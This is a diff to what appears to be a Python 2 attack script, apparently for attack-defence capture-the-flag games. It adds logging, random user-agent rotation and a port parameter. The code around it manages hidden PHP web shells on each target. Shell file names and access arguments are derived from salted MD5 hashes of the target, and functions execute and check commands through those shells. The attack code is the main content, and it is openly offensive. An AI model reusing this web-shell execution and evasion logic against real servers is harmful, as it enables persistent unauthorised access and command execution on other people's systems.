@@ -8,24 +8,35 @@ from string import maketrans
 import requests
 from urllib import quote
 import readline
- 
+import utils.log
+from random import randint
+
+Log = utils.log.Log() 
+user_agents = open('data/ua.data').readlines()
+
 def rot13(text):
     rot13trans = maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
     return text.translate(rot13trans)
 
 def dump_error(target,e,load_script):
-    print "[error] fail to attack: " + target + " with error: " + str(e) \
-    + " with the script: " + load_script 
+    Log.error("[error] fail to attack: " + target + " with error: " + str(e) \
+    + " with the script: " + load_script)
 
 def dump_warning(target,e,load_script):
-    print "[warning] fail to attack: " + target + " with error: " + str(e) \
-    + " with the script: " + load_script 
+    Log.warning("[warning] fail to attack: " + target + " with error: " + str(e) \
+    + " with the script: " + load_script)
 
 def dump_success(target,info,load_script):
-    print "[success] success to " + info + " from " + target + " with the script:"\
-    + load_script
+    Log.success("[success] success to " + info + " from " + target + " with the script:"\
+    + load_script)
 
-def execute_shell(target,cmd):
+def random_ua():
+    global headers
+    length = len(user_agents)
+    rand = randint(0,length-1)
+    return user_agents[rand].strip("\n")
+    
+def execute_shell(target,target_port,cmd):
     if shell_type==1 or shell_type==2:
 	shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
 	shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
@@ -44,7 +55,7 @@ def execute_shell(target,cmd):
 	    return "error occurs"
 	return res
 
-def check_shell(target,cmd):
+def check_shell(target,target_port,cmd):
     shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
     shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
     #print res
@@ -60,7 +71,7 @@ def check_shell(target,cmd):
 def visit_shell(target,cmd):
     shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
     shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
-    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name)
+    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=2)
     if res.status_code==200:
 	res.close()
 	return True
